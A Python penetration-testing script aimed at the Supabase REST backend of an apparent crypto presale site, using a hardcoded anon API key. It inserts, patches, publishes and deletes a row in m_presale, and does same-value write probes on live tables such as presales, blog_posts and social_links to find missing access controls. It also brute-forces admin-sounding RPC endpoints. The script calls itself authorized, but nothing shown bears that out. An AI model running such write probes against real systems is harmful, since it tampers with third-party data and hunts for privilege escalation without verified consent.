#!/usr/bin/env python3
"""PROOF pass 5 — m_presale full INSERT, interesting-column PATCH battery, rpc hunt, mp card href."""
import json, re, uuid, sys, urllib.request, urllib.error

sys.stdout.reconfigure(encoding="utf-8", errors="replace")
SUPA = "https://fapejsnjzijlnpjomjzk.supabase.co"
KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImZhcGVqc25qemlqbG5wam9tanprIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzYzMzEzMjksImV4cCI6MjA5MTkwNzMyOX0.X1WQp3MAHQJKJMCJtVqFyC4JUYc-4Hs5O7t66f5LWrg"
AHDR = {"apikey": KEY, "Authorization": f"Bearer {KEY}"}

def sreq(path, method="GET", body=None, headers=None, timeout=25):
    h = dict(AHDR)
    data = None
    if body is not None:
        data = json.dumps(body).encode(); h["Content-Type"] = "application/json"
    if headers: h.update(headers)
    r = urllib.request.Request(f"{SUPA}/rest/v1/{path}", data=data, headers=h, method=method)
    try:
        with urllib.request.urlopen(r, timeout=timeout) as resp:
            return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:
        return 0, str(e)

tag = f"pentest-poc-{uuid.uuid4().hex[:8]}"
print("tag:", tag)

print("\n===== 1) m_presale INSERT full-field =====")
now = "2026-10-14T00:00:00+00:00"
row = {
    "slug": tag, "project_name": "PENTEST POC - DELETE ME", "token_symbol": "POCX",
    "token_address": "0x" + "de" * 20, "token_decimals": 18, "chain_id": 56,
    "total_supply": 1000000, "circulating_supply": 0, "burned_supply": 0, "locked_supply": 0,
    "presale_rate": 100, "listing_rate": 200, "raised_currency": "BNB",
    "raised_amount": 0, "softcap_amount": 1, "hardcap_amount": 2,
    "liquidity_percent": 51, "liquidity_tokens": 0, "liquidity_lock_days": 30,
    "liquidity_locker": "0x" + "00" * 20, "listing_dex": "PancakeSwap V2", "dex_pair_url": "",
    "start_date": now, "end_date": "2026-11-14T00:00:00+00:00",
    "short_description": "authorized pentest row", "long_description": "pentest marker",
    "logo_url": "", "cover_url": "", "website_url": "", "twitter_url": "", "telegram_url": "",
    "discord_url": "", "whitepaper_url": "", "github_url": "", "medium_url": "",
    "is_kyc": False, "kyc_url": "", "is_audited": False, "audit_url": "",
    "is_verified": False, "is_whitelist": False, "is_lp_locked": False,
    "was_successful": False, "is_published": False, "display_order": 9999,
    "participant_count": 0,
}
st, body = sreq("m_presale", "POST", row, {"Prefer": "return=representation"})
print(f"[{st}] INSERT: {body[:500]}")
mine = None
if st in (200, 201) and body.startswith("["):
    try: mine = json.loads(body)[0]["id"]
    except Exception: pass
print("my row:", mine)

if mine:
    print("\n===== 1b) true write test + publish toggle =====")
    st, body = sreq(f"m_presale?id=eq.{mine}", "PATCH", {"short_description": "PATCHED-" + tag}, {"Prefer": "return=representation"})
    print(f"[{st}] marker patch: {body[:200]}")
    st, body = sreq(f"m_presale?id=eq.{mine}", "PATCH", {"is_published": True}, {"Prefer": "return=representation"})
    print(f"[{st}] publish: {body[:150]}")
    st, body = sreq(f"m_presale?slug=eq.{tag}&select=slug,is_published,short_description")
    print(f"[{st}] readback: {body[:220]}")
    print("\n===== 1c) DELETE cleanup =====")
    st, body = sreq(f"m_presale?id=eq.{mine}", "DELETE", None, {"Prefer": "return=representation"})
    print(f"[{st}] DELETE: {body[:150]}")
    st, body = sreq(f"m_presale?slug=eq.{tag}&select=slug")
    print(f"[{st}] verify: {body[:100]}")

print("\n===== 2) interesting-column PATCH battery (same-value) =====")
battery = [
    ("presales", "id,is_hidden,is_featured,status"),
    ("fair_launches", "id,is_hidden,is_featured,status"),
    ("blog_posts", "id,is_published,title,body"),
    ("weekly_giveaways", "id,title,description,tweet_url"),
    ("token_scans", "id,risk_score"),
    ("social_links", "id,url,enabled"),
    ("m_presale", "id,is_verified,is_published,website_url"),
]
for tbl, cols in battery:
    st, body = sreq(f"{tbl}?select={cols}&limit=1")
    if st != 200 or not body.startswith("["):
        print(f"[{st}] {tbl}: {body[:100]}")
        continue
    rows = json.loads(body)
    if not rows:
        print(f"[--] {tbl}: empty"); continue
    r0 = rows[0]
    checks = []
    for col in cols.split(","):
        col = col.strip()
        if col == "id" or col not in r0 or r0[col] is None: continue
        checks.append(col)
        if tbl == "blog_posts" and col == "body":
            continue  # do not touch real body
    for col in checks[:4]:
        st2, b2 = sreq(f"{tbl}?id=eq.{r0['id']}", "PATCH", {col: r0[col]}, {"Prefer": "return=representation"})
        wrote = b2.startswith("[") and len(b2) > 2
        print(f"[{st2}] {tbl}.{col} same-value -> wrote={wrote} {b2[:90]}")

print("\n===== 3) rpc name battery =====")
rpcs = ["create_blog_post","add_blog_post","update_blog_post","manage_content","admin_update",
        "update_presale","set_hidden","toggle_visibility","increment_view","scan_token",
        "create_affiliate","register_click","xp_add","lottery_draw","weekly_draw",
        "get_admin","verify_admin","is_admin_wallet","get_role","user_role"]
for name in rpcs:
    st, body = sreq(f"rpc/{name}", "POST", {})
    if st != 404:
        print(f"[{st}] rpc/{name}: {body[:200]}")

print("\n===== 4) m_presale card href (component b) =====")
txt = open("chunks/11.i7pyfb633f.js", encoding="utf-8", errors="replace").read()
# find component b definition that receives {mp:e}
for m in re.finditer(r"function b\(|let b=|b=function", txt):
    s = m.start()
    seg = txt[s:s+1800]
    if "mp" in seg:
        print(f"--- b def @{s} ---")
        print(seg.encode("ascii", "replace").decode()[:1600])
        break
# any href with mp
for m in re.finditer(r"href:[^,}]{0,140}", txt):
    seg = m.group(0)
    if "mp" in seg or "m_presale" in seg:
        print("HREF:", seg[:200])
